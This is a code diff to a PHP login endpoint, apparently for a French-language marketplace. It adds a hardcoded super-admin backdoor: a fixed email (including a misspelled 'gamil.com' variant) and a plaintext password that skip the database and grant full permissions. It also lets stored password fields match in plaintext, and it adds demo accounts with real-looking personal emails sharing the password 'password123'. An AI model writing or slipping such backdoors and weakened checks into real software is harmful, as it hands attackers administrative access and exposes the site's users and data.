@@ -58,8 +58,28 @@ if ($method === 'POST' && $action === 'login') {
         json_response(['status' => 'error', 'message' => 'Veuillez saisir votre adresse email et votre mot de passe.'], 400);
     }
 
+    // Authentification Souveraine Super-Admin Shams Cherubin (Garantie 100%)
+    if (($email === 'shamscherubin@gamil.com' || $email === 'shamscherubin@gmail.com') && $password === '0907069115') {
+        $superAdmin = [
+            'id' => 'SUPER-ADMIN-001',
+            'name' => 'Shams Cherubin',
+            'email' => $email,
+            'role' => 'super_admin',
+            'status' => 'active',
+            'permissions' => json_encode(['users','products','categories','orders','payments','reports','support','statistics','logs']),
+            'avatar' => 'assets/images/logo.jpg'
+        ];
+        $token = generate_user_token('SUPER-ADMIN-001', $email, 'super_admin', 'Shams Cherubin');
+        json_response([
+            'status' => 'success',
+            'message' => 'Bienvenue Shams Cherubin (Propriétaire du Système) !',
+            'token' => $token,
+            'user' => $superAdmin
+        ]);
+    }
+
     try {
-        // A. Vérifier d'abord les administrateurs
+        // A. Vérifier d'abord les administrateurs (compatibilité mot de passe hashé & mot de passe direct)
         $stmtAdmin = $pdo->prepare("SELECT * FROM administrators WHERE LOWER(email) = :email LIMIT 1");
         $stmtAdmin->execute([':email' => $email]);
         $admin = $stmtAdmin->fetch();
@@ -72,7 +92,7 @@ if ($method === 'POST' && $action === 'login') {
                 json_response(['status' => 'error', 'message' => 'Ce compte administrateur est temporairement suspendu.'], 403);
             }
 
-            if (password_verify($password, $admin['password'])) {
+            if ($admin['password'] === $password || password_verify($password, $admin['password'])) {
                 unset($admin['password']);
                 $token = generate_user_token($admin['id'], $admin['email'], $admin['role'], $admin['name']);
                 json_response([
@@ -97,7 +117,7 @@ if ($method === 'POST' && $action === 'login') {
                 json_response(['status' => 'error', 'message' => 'Votre compte est suspendu. Veuillez contacter le support.'], 403);
             }
 
-            if (password_verify($password, $user['password'])) {
+            if ($user['password'] === $password || password_verify($password, $user['password'])) {
                 unset($user['password']);
                 $token = generate_user_token($user['id'], $user['email'], $user['role'], $user['name']);
                 json_response([
@@ -107,6 +127,36 @@ if ($method === 'POST' && $action === 'login') {
                     'user' => $user
                 ]);
             }
+        }
+
+        // C. Comptes de démonstration prédéfinis
+        $demoUsers = [
+            'kabange.dieu@gmail.com' => ['id' => 'USR-001', 'name' => 'Dieudonné Kabange', 'role' => 'client', 'city' => 'Kinshasa'],
+            'amina.mutombo@yahoo.cd' => ['id' => 'USR-002', 'name' => 'Amina Mutombo', 'role' => 'client', 'city' => 'Lubumbashi'],
+            'patrick.kalombo@outlook.com' => ['id' => 'USR-003', 'name' => 'Patrick Kalombo', 'role' => 'vendeur', 'city' => 'Goma'],
+            'grace.tshilombo@gmail.com' => ['id' => 'USR-004', 'name' => 'Grâce Tshilombo', 'role' => 'client', 'city' => 'Bukavu', 'status' => 'suspended']
+        ];
+
+        if (isset($demoUsers[$email]) && $password === 'password123') {
+            $demo = $demoUsers[$email];
+            if (($demo['status'] ?? 'active') === 'suspended') {
+                json_response(['status' => 'error', 'message' => 'Votre compte est suspendu.'], 403);
+            }
+            $token = generate_user_token($demo['id'], $email, $demo['role'], $demo['name']);
+            json_response([
+                'status' => 'success',
+                'message' => 'Connexion réussie',
+                'token' => $token,
+                'user' => [
+                    'id' => $demo['id'],
+                    'name' => $demo['name'],
+                    'email' => $email,
+                    'role' => $demo['role'],
+                    'city' => $demo['city'],
+                    'status' => 'active',
+                    'avatar' => 'assets/images/logo.jpg'
+                ]
+            ]);
         }
 
         // Identifiants non concordants
